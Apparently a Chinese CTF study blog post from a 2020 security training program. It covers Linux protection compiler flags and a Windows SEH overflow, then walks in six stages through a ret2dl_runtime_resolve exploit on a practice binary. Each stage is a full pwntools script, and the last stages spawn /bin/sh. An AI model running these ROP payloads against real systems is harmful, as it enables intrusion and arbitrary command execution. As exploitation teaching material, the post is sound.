---
title: HWS计划2020day3
date:   2020-11-04 16:50:11
updated:  2020-11-04 16:50:11
tags:
    - pwn
    - ret2_dl_runtime_resolve
    - 栈溢出
    - linux保护机制
categories: 
	- HWS计划2020
use:
  - Valine
text: true
lazyload: true
count: true
---

# linux保护机制编译选项

## NX

开启：-z noexecstack

关闭：-z execstack

## PIE

开启：-pie-fPIC
关闭：-no-pie

## Canary

开启：（只为局部变量中含有char的函数插入保护代码）：-fstack-protector

   （为所有函数插入保护代码）：-fstack-protector-all

关闭：-fno-stack-protector

## Fortify

开启：-D_FORTIFY_SOURCE=2
关闭：-D_FORTIFY_SOURCE=0

## RELRO

开启（部分）：-z lazy
开启（完全）：-z now

# Windows栈溢出

- canary可以算出来：

Canary=___security_cookie^ebp

例题：

首先程序给出stack地址和程序基址

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604403606077-6ccfabdc-f08e-4447-a300-e9a3658c1f66.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604403670834-edb718a7-2bcf-49e7-a765-ac4f318f7828.png)

之后会有一个除0异常

跳转到这

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604403508591-51fd5a55-58a3-4aab-a99f-2ca5dabe4da0.png)

会验证1+1是否等于3，等于则打开flag.txt




![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604403452897-cfc88e70-5ae1-409e-a75d-78ee767595d0.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604403467115-b9df1a33-2a2a-4159-bd03-17b943b65eb2.png)

此程序中存在溢出函数fgets

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604403848096-9bfc1d8e-42f4-4d3b-81c2-f388137f3942.png)（伪造异常处理SEH）

# Linux内核

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604404198840-755b97ae-02c0-4ea3-8d98-ea2695711389.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604404447360-0b9ebcac-5c0a-48f9-a751-f096ee803da0.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604404630329-958e1843-cc17-496a-8d37-c87fe08f956f.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604404822952-74c615c9-9257-45c9-9cf7-a74f89801683.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604404836704-79dd6dc4-941a-44f0-a3e8-676645a3f7ab.png)

# dl_runtime_resolve

## 理论

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604474826753-5280092d-304a-49c8-add0-2ef9a08c0ac0.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604474997373-8840c4b0-7c4d-438f-85f5-73000b217328.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604474976338-b096962a-7650-41cd-a0be-953c7f79364c.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604475026565-30e1efc4-fe81-4d5a-b02d-1cdc4fec5a45.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604475068262-95cd56ac-ff77-4436-a44e-53d55dc94262.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604475119091-a1b66949-7b69-4d72-927d-925001271a16.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604475216880-38d02d35-8745-4908-8afb-7080724cba38.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604475319975-1eae3a02-c758-4aaf-aa71-577c67c4fc01.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604475388959-7a5bb4b9-df4a-4df1-8dcf-c9b40de6a3cb.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604475537890-1bfe6a72-63fd-472f-9c3e-cb08b3d47820.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604475690024-ce7c7364-5943-4613-af33-34d159a9dac8.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604475840826-27411b8b-3ac3-4708-a965-17e7c6d13a51.png)



![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604475924026-e42e5543-6e82-4ab2-915f-77241fe4935c.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604476103324-7cc5bb23-b226-4e8d-99d8-30b7bb5a572a.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604476122553-a1708072-c62b-45ca-aec1-0e5aa2256dae.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604476262704-210e43f9-3026-4fc9-9af1-7bf1cd630a32.png)

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604476328096-38d38e63-6420-4036-a539-22ac304a68cb.png)

## 例题

![image.png](http://qiniu.zhixia.xyz/qiniuimg/1604476502888-316fccd8-3249-4436-9917-901aa68c7346.png)

### stage1

打印字符

```python
from pwn import *

io=process('./bof')
elf=ELF('./bof')
context.log_level='debug'

write_plt=elf.plt['write']
read_plt=elf.plt['read']
write_got=elf.got['write']
bss_addr=elf.bss()

stack_size=0x800
base_stage=bss_addr+stack_size

p_p_p_ret=0x0804856c
leave_ret=0x08048481
pop_ebp_ret=0x08048453

payload1='a'*112
payload1+=p32(read_plt)
payload1+=p32(p_p_p_ret)
payload1+=p32(0)
payload1+=p32(base_stage)
payload1+=p32(100)
payload1+=p32(pop_ebp_ret)
payload1+=p32(base_stage)
payload1+=p32(leave_ret)

binsh_addr=base_stage+80
cmd='/bin/sh\x00'

payload2='aaaa'
payload2+=p32(write_plt)
payload2+='dead'
payload2+=p32(1)
payload2+=p32(binsh_addr)
payload2+=p32(len(cmd))
payload2=payload2.ljust(80,'d')
payload2+=cmd
payload2=payload2.ljust(100,'d')

io.recvuntil('2015~!')
io.sendline(payload1)
sleep(1)
io.sendline(payload2)

io.interactive()
```

### stage2

返回到PLT0，带上index_offset

```python
from pwn import *

io=process('./bof')
elf=ELF('./bof')
context.log_level='debug'

write_plt=elf.plt['write']
read_plt=elf.plt['read']
write_got=elf.got['write']
bss_addr=elf.bss()

stack_size=0x800
base_stage=bss_addr+stack_size

p_p_p_ret=0x0804856c
leave_ret=0x08048481
pop_ebp_ret=0x08048453

payload1='a'*112
payload1+=p32(read_plt)
payload1+=p32(p_p_p_ret)
payload1+=p32(0)
payload1+=p32(base_stage)
payload1+=p32(100)
payload1+=p32(pop_ebp_ret)
payload1+=p32(base_stage)
payload1+=p32(leave_ret)


plt_start=0x8048370
rel_offset=0x20
binsh_addr=base_stage+80
cmd='/bin/sh\x00'

payload2='aaaa'
payload2+=p32(plt_start)
payload2+=p32(rel_offset)
payload2+='dead'
payload2+=p32(1)
payload2+=p32(binsh_addr)
payload2+=p32(len(cmd))
payload2=payload2.ljust(80,'d')
payload2+=cmd
payload2=payload2.ljust(100,'d')

io.recvuntil('2015~!')
io.sendline(payload1)
sleep(1)
io.sendline(payload2)

io.interactive()
```

### stage3

通过控制index_offset指向伪造的fake_reloc

```python
from pwn import *

io=process('./bof')
elf=ELF('./bof')
context.log_level='debug'

write_plt=elf.plt['write']
read_plt=elf.plt['read']
write_got=elf.got['write']
bss_addr=elf.bss()

stack_size=0x800
base_stage=bss_addr+stack_size

p_p_p_ret=0x0804856c
leave_ret=0x08048481
pop_ebp_ret=0x08048453

payload1='a'*112
payload1+=p32(read_plt)
payload1+=p32(p_p_p_ret)
payload1+=p32(0)
payload1+=p32(base_stage)
payload1+=p32(100)
payload1+=p32(pop_ebp_ret)
payload1+=p32(base_stage)
payload1+=p32(leave_ret)

JMPREL=0x8048318
plt_start=0x8048370
fake_rel_addr=base_stage+28
rel_offset=fake_rel_addr-JMPREL
r_info=0x507
fake_rel=p32(write_got)+p32(r_info)
binsh_addr=base_stage+80
cmd='/bin/sh\x00'

payload2='aaaa'
payload2+=p32(plt_start)
payload2+=p32(rel_offset)
payload2+='dead'
payload2+=p32(1)
payload2+=p32(binsh_addr)
payload2+=p32(len(cmd))
payload2+=fake_rel
payload2=payload2.ljust(80,'d')
payload2+=cmd
payload2=payload2.ljust(100,'d')

io.recvuntil('2015~!')
io.sendline(payload1)
sleep(1)
io.sendline(payload2)

io.interactive()
```

### stage4

伪造fake_sym指向st_name

```python
from pwn import *

io=process('./bof')
elf=ELF('./bof')
context.log_level='debug'

write_plt=elf.plt['write']
read_plt=elf.plt['read']
write_got=elf.got['write']
bss_addr=elf.bss()

stack_size=0x800
base_stage=bss_addr+stack_size

p_p_p_ret=0x0804856c
leave_ret=0x08048481
pop_ebp_ret=0x08048453

payload1='a'*112
payload1+=p32(read_plt)
payload1+=p32(p_p_p_ret)
payload1+=p32(0)
payload1+=p32(base_stage)
payload1+=p32(100)
payload1+=p32(pop_ebp_ret)
payload1+=p32(base_stage)
payload1+=p32(leave_ret)

JMPREL=0x8048318
SYMTAB=0x80481d8
plt_start=0x8048370
fake_rel_addr=base_stage+28
rel_offset=fake_rel_addr-JMPREL
binsh_addr=base_stage+80
cmd='/bin/sh\x00'

fake_sym_addr=base_stage+36
align=0x10-((fake_sym_addr-SYMTAB)&0xf)
fake_sym_addr=fake_sym_addr+align
r_info=((fake_sym_addr-SYMTAB)/0x10<<8)|0x7
fake_rel=p32(write_got)+p32(r_info)

st_name=0x54
fake_sym=p32(st_name)+p32(0)+p32(0)+p32(0x12)

payload2='aaaa'
payload2+=p32(plt_start)
payload2+=p32(rel_offset)
payload2+='dead'
payload2+=p32(1)
payload2+=p32(binsh_addr)
payload2+=p32(len(cmd))
payload2+=fake_rel
payload2+='c'*align
payload2+=fake_sym
payload2=payload2.ljust(80,'d')
payload2+=cmd
payload2=payload2.ljust(100,'d')

io.recvuntil('2015~!')
io.sendline(payload1)
sleep(1)
io.sendline(payload2)

io.interactive()
```

### stage5

st_name指向伪造的字符串'write'

```python
from pwn import *

io=process('./bof')
elf=ELF('./bof')
context.log_level='debug'

write_plt=elf.plt['write']
read_plt=elf.plt['read']
write_got=elf.got['write']
bss_addr=elf.bss()

stack_size=0x800
base_stage=bss_addr+stack_size

p_p_p_ret=0x0804856c
leave_ret=0x08048481
pop_ebp_ret=0x08048453

payload1='a'*112
payload1+=p32(read_plt)
payload1+=p32(p_p_p_ret)
payload1+=p32(0)
payload1+=p32(base_stage)
payload1+=p32(100)
payload1+=p32(pop_ebp_ret)
payload1+=p32(base_stage)
payload1+=p32(leave_ret)

JMPREL=0x8048318
SYMTAB=0x80481d8
STRTAB=0x8048268
plt_start=0x8048370
fake_rel_addr=base_stage+28
rel_offset=fake_rel_addr-JMPREL
binsh_addr=base_stage+80
cmd='/bin/sh\x00'

fake_sym_addr=base_stage+36
align=0x10-((fake_sym_addr-SYMTAB)&0xf)
fake_sym_addr=fake_sym_addr+align
r_info=((fake_sym_addr-SYMTAB)/0x10<<8)|0x7
fake_rel=p32(write_got)+p32(r_info)

fake_name_addr=fake_sym_addr+16
st_name=fake_name_addr-STRTAB
fake_sym=p32(st_name)+p32(0)+p32(0)+p32(0x12)

payload2='aaaa'
payload2+=p32(plt_start)
payload2+=p32(rel_offset)
payload2+='dead'
payload2+=p32(1)
payload2+=p32(binsh_addr)
payload2+=p32(len(cmd))
payload2+=fake_rel
payload2+='c'*align
payload2+=fake_sym
payload2+='write\x00'
payload2=payload2.ljust(80,'d')
payload2+=cmd
payload2=payload2.ljust(100,'d')

io.recvuntil('2015~!')
io.sendline(payload1)
sleep(1)
io.sendline(payload2)

io.interactive()
```

### stage6

替换write为system，并修改参数，获取shell

```python
from pwn import *

io=process('./bof')
elf=ELF('./bof')
context.log_level='debug'

write_plt=elf.plt['write']
read_plt=elf.plt['read']
write_got=elf.got['write']
bss_addr=elf.bss()

stack_size=0x800
base_stage=bss_addr+stack_size

p_p_p_ret=0x0804856c
leave_ret=0x08048481
pop_ebp_ret=0x08048453

payload1='a'*112
payload1+=p32(read_plt)
payload1+=p32(p_p_p_ret)
payload1+=p32(0)
payload1+=p32(base_stage)
payload1+=p32(100)
payload1+=p32(pop_ebp_ret)
payload1+=p32(base_stage)
payload1+=p32(leave_ret)

JMPREL=0x8048318
SYMTAB=0x80481d8
STRTAB=0x8048268
plt_start=0x8048370
fake_rel_addr=base_stage+28
rel_offset=fake_rel_addr-JMPREL
binsh_addr=base_stage+80
cmd='/bin/sh\x00'

fake_sym_addr=base_stage+36
align=0x10-((fake_sym_addr-SYMTAB)&0xf)
fake_sym_addr=fake_sym_addr+align
r_info=((fake_sym_addr-SYMTAB)/0x10<<8)|0x7
fake_rel=p32(write_got)+p32(r_info)

fake_name_addr=fake_sym_addr+16
st_name=fake_name_addr-STRTAB
fake_sym=p32(st_name)+p32(0)+p32(0)+p32(0x12)

payload2='aaaa'
payload2+=p32(plt_start)
payload2+=p32(rel_offset)
payload2+='dead'
payload2+=p32(binsh_addr)
payload2+='bbbb'
payload2+='bbbb'
payload2+=fake_rel
payload2+='c'*align
payload2+=fake_sym
payload2+='system\x00'
payload2=payload2.ljust(80,'d')
payload2+='/bin/sh\x00'
payload2=payload2.ljust(100,'d')

io.recvuntil('2015~!')
io.sendline(payload1)
sleep(1)
io.sendline(payload2)

io.interactive()
```

### 使用工具

```python
from roputils import *
from pwn import process
from pwn import gdb
from pwn import context

r=process('./bof')
context.log_level='debug'
r.recv()

rop=ROP('./bof')
offset=112
bss_base=rop.section('.bss')
buf=rop.fill(offset)

buf+=rop.call('read',0,bss_base,100)
buf+=rop.dl_resolve_call(bss_base+20,bss_base)
r.send(buf)

buf=rop.string('/bin/sh')
buf+=rop.fill(20,buf)
buf+=rop.dl_resolve_data(bss_base+20,'system')
buf+=rop.fill(100,buf)
r.send(buf)
r.interactive()
```